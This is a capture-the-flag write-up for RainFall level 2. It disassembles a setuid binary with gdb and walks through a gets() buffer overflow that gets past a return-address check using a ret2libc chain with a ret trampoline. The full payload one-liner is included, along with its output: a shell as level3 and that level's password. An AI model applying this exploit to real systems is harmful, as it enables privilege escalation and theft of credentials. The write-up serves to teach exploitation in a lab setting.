# Rainfall

## Level2

```sh
level2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```

```sh
level2@RainFall:~$ ./level2 
hello
hello
level2@RainFall:~$ 
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   # Set and Align stack
   0x08048545 <+6>:     call   0x80484d4 <p>
   # Call the p function
   0x0804854a <+11>:    leave  
   0x0804854b <+12>:    ret    
End of assembler dump.
(gdb) 
```

```sh
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp # Allocate 0x68 (104) bytes on the stack
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt> #Flush the output
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax # Load EBP - 76 address into eax
   0x080484ea <+22>:    mov    %eax,(%esp) # Put the buffer pointer at the top of the stack
   0x080484ed <+25>:    call   0x80483c0 <gets@plt> # gets(buffer)
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax # Load the saved return address into eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp) # Save it into a variable
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax # Load it back into eax
   0x080484fb <+39>:    and    $0xb0000000,%eax # Bitwise AND eax with 0xb0000000
   0x08048500 <+44>:    cmp    $0xb0000000,%eax # Compare the masked return address with 0xb0000000
   0x08048505 <+49>:    jne    0x8048527 <p+83> # If not equal, skip to PATH B

   0x08048507 <+51>:    mov    $0x8048620,%eax # PATH A (bad)
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt> # exit

   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax # PATH B (good)
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret    
End of assembler dump.
```

```sh
              +---------------------------+
              |       Start of p          |
              |  (push ebp, set ebp, etc.) |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Allocate 104 bytes on     |
              | the stack (sub $0x68,esp)  |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Flush output (fflush)     |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Compute & load address of |
              | 76-byte buffer (lea -0x4c) |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Call gets(buffer)         |
              |  (User input is stored)   |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Retrieve saved return     |
              | address from caller       |
              | (mov 0x4(%ebp),eax)        |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Save return address in    |
              | local variable (-0xc)     |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Mask saved return address |
              | with 0xb0000000 (AND)     |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Compare with 0xb0000000   |
              +-------------+-------------+
                            |
                +-----------+-----------+
          (Equal)|                       |(Not Equal)
                v                       v
       +------------------+    +--------------------------+
       | Path A:          |    | Path B:                  |
       | Condition True   |    | Condition False          |
       +------------------+    +--------------------------+
       |                  |    |                          |
       |  Load constant   |    |  Load buffer address     |
       |  0x8048620 into |    |  (for puts)              |
       |  EAX             |    |                          |
       |                  |    |  Call puts(buffer)       |
       +------------------+    +--------------------------+
       |                  |    |                          |
       |  Prepare printf  |    |  Load buffer address     |
       |  arguments:      |    |  (for strdup)            |
       |   - Saved return |    |                          |
       |     address,     |    |  Call strdup(buffer)     |
       |   - Constant     |    |                          |
       +------------------+    +--------------------------+
       |  Call printf()   |    |  Leave stack frame &     |
       |                  |    |  return to caller        |
       +------------------+    +--------------------------+
       |  Push constant 1 |
       |  and call _exit()|
       |  (Terminate p)   |
       +------------------+
```

### Explanation

32-bit binary, unbounded gets, anti-libc/stack check on the saved return address, so `ret2libc` + a ret trampoline.

The path the we need to exploit is the path B, lets keep only the necessary instruction of the B path for clarity

```sh
lea    -0x4c(%ebp),%eax; # Load address EBP-76 into eax (buffer)
mov    %eax,(%esp) # move eax to the top of the stack
call   0x80483c0 <gets@plt> # call gets(buffer)
...
mov    -0xc(%ebp),%eax # store the EBP + 4 into a variable 
cmp    $0xb0000000,%eax # check if the variable is a libc address
....
leave  # ESP = EBP ; pop %ebp      (EBP = *ESP ; ESP += 4)
0x0804853e ret   # EIP = *ESP ; ESP += 4
```

So in order to exploit it we first need to `overflow` the buffer passed to `gets()`
The buffer address is located at `EBP-76` so we need 76 padding characters to reach EBP, 4 more to reach EBP + 4 where we store the future EIP value

For the EIP value we will use the ret address directly 

So our payload looks like this for now
```sh
80 random padding characters
0x0804853e # ret address
```

When it will reach the `ret` instruction it will be executed and then it will re-execute the `ret` instruction once more using this time the value stored in EBP + 8 so we need to store in EBP + 8 our real target address this time, let's retrieve the address of `system()` and since the system call will also need its own return address (in EBP + 12) we can also retrieve the address of `exit()` to exit cleanly when we're done

```sh
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) run
Starting program: /home/user/level2/level2 

Breakpoint 1, 0x08048542 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

We will also need the address of `"/bin/sh"` in order to pass it as an argument to system (to store in EBP + 16), luckily the string is stored directly in the libc so we can retrieve it like this

```sh
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) run
Starting program: /home/user/level2/level2 

Breakpoint 1, 0x08048542 in main ()
(gdb) info proc map
process 2632
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
         0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0 
        0xb7fdb000 0xb7fdd000     0x2000        0x0 
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fd2000, "/bin/sh" # 0xb7e2c000 = start of libc, 0xb7fd2000 end of libc
0xb7f8cc58 # Address of the string "/bin/sh"
1 pattern found
```

So now we have our complete payload
```sh
80 random padding characters
0x0804853e # ret address (pass the check, perform the trampoline trick)
0xb7e6b060 # system address
0xb7e5ebe0 # exit address
0xb7f8cc58 # "/bin/sh" address
```
```sh
level2@RainFall:~$ (python -c 'print "a"*80  + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"' ; cat) | ./level2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>aaaaaaaaaaaa>`�����X���
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```